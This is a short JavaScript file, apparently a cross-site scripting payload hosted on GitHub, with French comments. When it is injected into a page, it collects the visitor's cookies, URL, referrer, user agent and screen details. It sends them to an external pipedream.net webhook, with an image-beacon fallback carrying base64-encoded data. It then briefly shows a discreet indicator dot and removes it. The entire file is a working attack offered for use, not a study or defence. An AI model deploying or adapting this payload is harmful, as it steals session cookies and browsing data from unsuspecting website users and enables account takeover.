// =============================================
// XSS PAYLOAD - exon2007
// =============================================

// 1. TEST IMMÉDIAT
console.log('✅ XSS Payload chargé depuis GitHub');

// 2. COLLECTE DE DONNÉES
const data = {
    url: window.location.href,
    title: document.title,
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    referrer: document.referrer,
    timestamp: new Date().toISOString(),
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language
};

// 3. ENVOI VERS WEBHOOK
fetch('https://eoj3zpscoeyfiry.m.pipedream.net', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-XSS-Source': 'GitHub-Payload'
    },
    body: JSON.stringify(data),
    mode: 'no-cors'
})
.then(() => console.log('📨 Données envoyées avec succès'))
.catch(error => {
    console.error('❌ Erreur envoi:', error);
    // Fallback avec image
    new Image().src = `https://eoj3zpscoeyfiry.m.pipedream.net/?fallback=1&data=${btoa(JSON.stringify(data))}`;
});

// 4. INDICATEUR VISUEL DISCRET
const indicator = document.createElement('div');
indicator.style = `
    position: fixed;
    bottom: 10px;
    right: 10px;
    width: 10px;
    height: 10px;
    background: #00ff00;
    border-radius: 50%;
    z-index: 9999;
    opacity: 0.6;
    pointer-events: none;
`;
document.body.appendChild(indicator);

// 5. NETTOYAGE AUTOMATIQUE
setTimeout(() => {
    indicator.style.opacity = '0';
    setTimeout(() => indicator.remove(), 1000);
}, 5000);
